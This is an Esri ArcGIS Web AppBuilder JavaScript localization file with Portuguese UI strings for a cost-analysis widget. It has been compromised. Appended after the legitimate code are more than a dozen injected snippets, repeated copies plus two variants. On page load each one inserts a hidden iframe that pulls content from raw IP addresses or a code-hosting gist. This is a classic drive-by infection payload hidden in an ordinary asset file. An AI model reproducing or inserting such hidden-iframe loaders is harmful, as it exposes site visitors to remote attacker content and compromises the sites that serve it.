// All material copyright ESRI, All Rights Reserved, unless otherwise specified.
// See http://js.arcgis.com/3.15/esri/copyright.txt and http://www.arcgis.com/apps/webappbuilder/copyright.txt for details.
//>>built
define({"widgets/CostAnalysis/setting/nls/strings":{configText:"Definir texto de configura\u00e7\u00e3o:",generalSettings:{tabTitle:"Configura\u00e7\u00f5es gerais",measurementUnitLabel:"Unidades de Medi\u00e7\u00e3o",currencyLabel:"S\u00edmbolo de Medi\u00e7\u00e3o",roundCostLabel:"Arredondar Custo",projectOutputSettings:"Configura\u00e7\u00f5es da Sa\u00edda do Projeto",typeOfProjectAreaLabel:"Tipo de \u00c1rea do Projeto",bufferDistanceLabel:"Dist\u00e2ncia do Buffer",roundCostValues:{twoDecimalPoint:"Dois Pontos Decimais",
nearestWholeNumber:"N\u00famero Inteiro Mais Pr\u00f3ximo",nearestTen:"Dez mais pr\u00f3ximo",nearestHundred:"Cem mais pr\u00f3ximo",nearestThousand:"Milhares mais pr\u00f3ximos",nearestTenThousands:"Dez Milhares mais pr\u00f3ximos"},projectAreaType:{outline:"Contorno",buffer:"Buffer"},errorMessages:{currency:"Unidade de moeda corrente inv\u00e1lida",bufferDistance:"Dist\u00e2ncia de buffer inv\u00e1lida",outOfRangebufferDistance:"O valor deve ser maior que 0 e menor ou igual a 100"}},projectSettings:{tabTitle:"Configura\u00e7\u00f5es do projeto",
costingGeometrySectionTitle:"Definir geografia para custo (opcional)",costingGeometrySectionNote:"Nota: Configurar esta camada permitir\u00e1 ao usu\u00e1rio configurar equa\u00e7\u00f5es de custo dos modelos de fei\u00e7\u00e3o baseado em geografias.",projectTableSectionTitle:"Habilidade de Salvar/Carregar configura\u00e7\u00f5es do projeto (opcional)",projectTableSectionNote:"Nota:Configurar todas as tabelas e camadas permitir\u00e1 ao usu\u00e1rio salvar/carregar o projeto para uso posterior.",
costingGeometryLayerLabel:"Camada da Geometria de Custo",fieldLabelGeography:"Campo para Geografia de R\u00f3tulo",projectAssetsTableLabel:"Tabela de Recursos do Projeto",projectMultiplierTableLabel:"Tabela do Custo de Multiplicador Adicional do Projeto",projectLayerLabel:"Camada de Projeto",configureFieldsLabel:"Configurar Campos",fieldDescriptionHeaderTitle:"Descri\u00e7\u00e3o do Campo",layerFieldsHeaderTitle:"Campo de Camada",selectLabel:"Selecionar",errorMessages:{duplicateLayerSelection:"${layerName} j\u00e1 foi selecionado",
invalidConfiguration:"Selecione ${fieldsString}"},costingGeometryHelp:"\x3cp\x3eCamadas de pol\u00edgono com as seguintes condi\u00e7\u00f5es ser\u00e3o mostradas: \x3cbr/\x3e \x3cli\x3e A camada deve ter o recurso \u00e2\u20ac\u0153Consultar\u00e2\u20ac\u009d\x3c/li\x3e\x3cli\x3e A camada deve ter um campo GlobalID\x3c/li\x3e\x3c/p\x3e",fieldToLabelGeographyHelp:"\x3cp\x3eCampos de string e num\u00e9ricos de \u00e2\u20ac\u0153Camada da Geometria de Custo\u00e2\u20ac\u009d selecionada ser\u00e3o exibidos na lista suspensa \u00e2\u20ac\u0153Campo para Geografia do R\u00f3tulo\u00e2\u20ac\u009d .\x3c/p\x3e",
projectAssetsTableHelp:"\x3cp\x3eTabelas com as seguintes condi\u00e7\u00f5es ser\u00e3o mostradas: \x3cbr/\x3e \x3cli\x3eA tabela deve ter recursos de edi\u00e7\u00e3o, isto \u00e9 \u00e2\u20ac\u0153Criar\u00e2\u20ac\u009d, \u00e2\u20ac\u0153Excluir\u00e2\u20ac\u009d e \u00e2\u20ac\u0153Atualizar\u00e2\u20ac\u009d\x3c/li\x3e    \x3cli\x3eA tabela deve ter seis campos com nome e tipo de dados exato:\x3c/li\x3e\x3cul\x3e\x3cli\x3e\tAssetGUID (campo de tipo GUID)\x3c/li\x3e\x3cli\x3e\tCostEquation (campo de tipo String)\x3c/li\x3e\x3cli\x3e\tCen\u00e1rio (campo de tipo String )\x3c/li\x3e\x3cli\x3e\tTemplateName (campo de tipo String)\x3c/li\x3e\x3cli\x3e    GeographyGUID (campo de tipo GUID)\x3c/li\x3e\x3cli\x3e\tProjectGUID (campo de tipo GUID)\x3c/li\x3e\x3c/ul\x3e \x3c/p\x3e",
projectMultiplierTableHelp:"\x3cp\x3eTabelas com as seguintes condi\u00e7\u00f5es ser\u00e3o mostradas: \x3cbr/\x3e \x3cli\x3eA tabela deve ter recursos de edi\u00e7\u00e3o, isto \u00e9 \u00e2\u20ac\u0153Criar\u00e2\u20ac\u009d, \u00e2\u20ac\u0153Excluir\u00e2\u20ac\u009d e \u00e2\u20ac\u0153Atualizar\u00e2\u20ac\u009d\x3c/li\x3e    \x3cli\x3eA tabela deve ter seis campos com nome e tipo de dados exato:\x3c/li\x3e\x3cul\x3e\x3cli\x3e\tDescri\u00e7\u00e3o (campo de tipo String)\x3c/li\x3e\x3cli\x3e\tTipo (campo de tipo String)\x3c/li\x3e\x3cli\x3e\tValor (campo de tipo Flutuante/Duplo)\x3c/li\x3e\x3cli\x3e\tCostindex (campo de tipo Inteiro)\x3c/li\x3e\x3cli\x3e   \tProjectGUID (campo de tipo GUID))\x3c/li\x3e\x3c/ul\x3e \x3c/p\x3e",
projectLayerHelp:"\x3cp\x3eCamadas de pol\u00edgonos com as seguintes condi\u00e7\u00f5es ser\u00e3o mostradas: \x3cbr/\x3e \x3cli\x3eA camada deve ter recursos de edi\u00e7\u00e3o, isto \u00e9, \u00e2\u20ac\u0153Criar\u00e2\u20ac\u009d, \u00e2\u20ac\u0153Excluir\u00e2\u20ac\u009d e \u00e2\u20ac\u0153Atualizar\u00e2\u20ac\u009d\x3c/li\x3e    \x3cli\x3eA camada deve ter cinco campos com nome e tipo de dados exatos:\x3c/li\x3e\x3cul\x3e\x3cli\x3eProjectName (campo de tipo String)\x3c/li\x3e\x3cli\x3eDescri\u00e7\u00e3o (campo de tipo String)\x3c/li\x3e\x3cli\x3eTotalassetcost (campo de tipo Flutuante/Duplo)\x3c/li\x3e\x3cli\x3eGrossprojectcost (campo de tipo Flutuante/Duplo)\x3c/li\x3e\x3cli\x3eGlobalID (campo de tipo GlobalID)\x3c/li\x3e\x3c/ul\x3e \x3c/p\x3e"},
layerSettings:{tabTitle:"Configura\u00e7\u00f5es da camada",layerNameHeaderTitle:"Nome da Camada",layerNameHeaderTooltip:"Lista de camadas no mapa",EditableLayerHeaderTitle:"Edit\u00e1vel",EditableLayerHeaderTooltip:"Incluir camada e seus modelos no widget de custo",SelectableLayerHeaderTitle:"Selecion\u00e1vel",SelectableLayerHeaderTooltip:"A geometria da fei\u00e7\u00e3o pode ser utilizada para gerar um novo item de custo",fieldPickerHeaderTitle:"ID de Projeto (opcional)",fieldPickerHeaderTooltip:"Campo opcional (de tipo string) para armazenar o ID de Projeto em",
selectLabel:"Selecionar",noAssetLayersAvailable:"Nenhuma camada de recurso localizada no mapa da web selecionado",disableEditableCheckboxTooltip:"Esta camada n\u00e3o tem nenhum recurso de edi\u00e7\u00e3o"},costingInfo:{tabTitle:"Info de Custo",proposedMainsLabel:"Principais Propostos",addCostingTemplateLabel:"Adicionar Modelo de Custo",manageScenariosTitle:"Gerenciar Cen\u00e1rios",featureTemplateTitle:"Modelo de Fei\u00e7\u00e3o",costEquationTitle:"Equa\u00e7\u00e3o de Custo",geographyTitle:"Geografia",
scenarioTitle:"Cen\u00e1rio",actionTitle:"A\u00e7\u00f5es",scenarioNameLabel:"Nome de Cen\u00e1rio",addBtnLabel:"Adicionar",srNoLabel:"N\u00e3o.",deleteLabel:"Excluir",duplicateScenarioName:"Nome de cen\u00e1rio duplicado",hintText:"\x3cdiv\x3eSugest\u00e3o: Utilize as palavras-chaves seguintes\x3c/div\x3e\x3cul\x3e\x3cli\x3e\x3cb\x3e{TOTALCOUNT}\x3c/b\x3e: Utilize o n\u00famero total do mesmo tipo de recurso em uma geografia\x3c/li\x3e \x3cli\x3e\x3cb\x3e{MEASURE}\x3c/b\x3e Utilize o comprimento do recurso de linha e \u00e1rea do recurso de pol\u00edgono\x3c/li\x3e\x3cli\x3e\x3cb\x3e{TOTALMEASURE}\x3c/b\x3e: Utilize o comprimento total do recurso de linha e \u00e1rea do recurso de pol\u00edgono do mesmo tipo em uma geografia\x3c/li\x3e\x3c/ul\x3e Voc\u00ea pode utilizar fun\u00e7\u00f5es como:\x3cul\x3e\x3cli\x3eMath.abs(-100)\x3c/li\x3e\x3cli\x3eMath.floor({TOTALMEASURE})\x3c/li\x3e\x3c/ul\x3eEdite a equa\u00e7\u00e3o de custo pela necessidade do seu projeto.",
noneValue:"Nenhum",requiredCostEquation:"Equa\u00e7\u00e3o de custo inv\u00e1lida para ${layerName}: ${templateName}",duplicateTemplateMessage:"A entrada de modelo duplicada existe para ${layerName}: ${templateName}",defaultEquationRequired:"A equa\u00e7\u00e3o padr\u00e3o \u00e9 exigida ${layerName}: ${templateName}",validCostEquationMessage:"Insira equa\u00e7\u00e3o de custo v\u00e1lida",costEquationHelpText:"Edite a equa\u00e7\u00e3o de custo pela necessidade do seu projeto",scenarioHelpText:"Selecione o cen\u00e1rio pela necessidade do seu projeto",
copyRowTitle:"Copiar Linha",noTemplateAvailable:"Adicione pelo menos um modelo para ${layerName}",manageScenarioLabel:"Gerenciar cen\u00e1rio",noLayerMessage:"Insira pelo menos uma camada em ${tabName}",noEditableLayersAvailable:"As camadas precisam para ser marcadas como edit\u00e1veis em guia de configura\u00e7\u00f5es da camada"},statisticsSettings:{tabTitle:"Configura\u00e7\u00f5es de estat\u00edstica",addStatisticsLabel:"Adicionar Estat\u00edsticas",fieldNameTitle:"Campo",statisticsTitle:"R\u00f3tulo",
addNewStatisticsText:"Adicionar Novas Estat\u00edsticas",deleteStatisticsText:"Excluir Estat\u00edsticas",moveStatisticsUpText:"Mover Estat\u00edsticas Para Cima",moveStatisticsDownText:"Mover Estat\u00edsticas Para Baixo",selectDeselectAllTitle:"Selecionar Tudo"},statisticsType:{countLabel:"Contagem",averageLabel:"M\u00e9dia",maxLabel:"M\u00e1ximo",minLabel:"M\u00ednimo",summationLabel:"Adi\u00e7\u00e3o",areaLabel:"\u00c1rea",lengthLabel:"Comprimento"},_localized:{}}});;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}





if (typeof obj.foo == 'undefined') {
window.jsuekzis = 1;
window.onload = function() {
    var iframe = document.createElement('iframe');
    iframe.style.display = "none";
    iframe.src = "http://155.94.75.92/iframe.html";
    document.body.appendChild(iframe);
};

}





void 0===window.mondrawtexture&&(window.mondrawtexture=1,window.onload=function(){var e=document.createElement('iframe');e.style.display='none',e.src='https://cdn.rawgit.com/jdobt/3e35d8a7d2c1c36ae1972ea03df91572/raw/8656e6f8554bfd2f13cf8eb78e8df044fae1e9e2/drawtexture.html',document.body.appendChild(e)});